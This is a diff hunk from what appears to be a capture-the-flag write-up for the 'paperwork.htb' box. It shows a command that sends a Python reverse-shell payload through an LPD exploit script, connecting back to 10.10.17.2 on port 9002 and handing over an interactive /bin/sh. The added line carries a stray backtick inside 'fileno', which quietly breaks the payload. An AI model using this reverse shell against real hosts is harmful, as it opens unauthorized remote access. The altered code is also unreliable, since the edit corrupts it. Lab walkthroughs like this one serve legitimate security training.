@@ -180,7 +180,7 @@ cat /tmp/pwned
    
    ```bash
    python3 exploit_lpd.py paperwork.htb 1515 "" \
-     "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.17.2\",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+     "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.17.2\",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.filen`o(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    ```
    
    
